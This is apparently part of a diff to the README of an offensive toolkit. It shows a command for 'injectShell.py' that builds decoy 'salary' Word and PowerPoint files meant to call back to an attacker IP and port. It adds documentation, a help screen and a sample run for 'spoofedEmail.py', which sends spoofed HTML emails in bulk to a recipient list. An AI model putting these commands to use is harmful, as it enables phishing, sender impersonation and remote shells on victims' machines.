@@ -39,4 +39,28 @@ $  python injectShell.py -t all -o salary -ip 192.168.1.6 -port 1111
 - Generated: salary.doc
 - Generated: salary.ppt
 ```
+  
+  
+**spoofedEmail.py**  
+  
+Below is the help screen of the script.    
+```
+$ python spoofedEmail.py -h
+usage: spoofedEmail.py [-h] [-f F] [-n N] [-e E] [-t T] [-iL IL] [-v]
 
+optional arguments:
+  -h, --help  show this help message and exit
+  -f F        [html file containing the email body]
+  -n N        [recipient name]
+  -e E        [recipient email]
+  -t T        [delay between 1 to x seconds (random)]
+  -iL IL      [file containing recipient name and email addresses per line
+              separated by comma]
+  -v          [verbose]
+```
+  
+Below is the script in action.  
+```
+$ python spoofedEmail.py -iL namelist.txt -f sampleHtml.txt -t 10
+Sending email to: test01@example.com  
+```
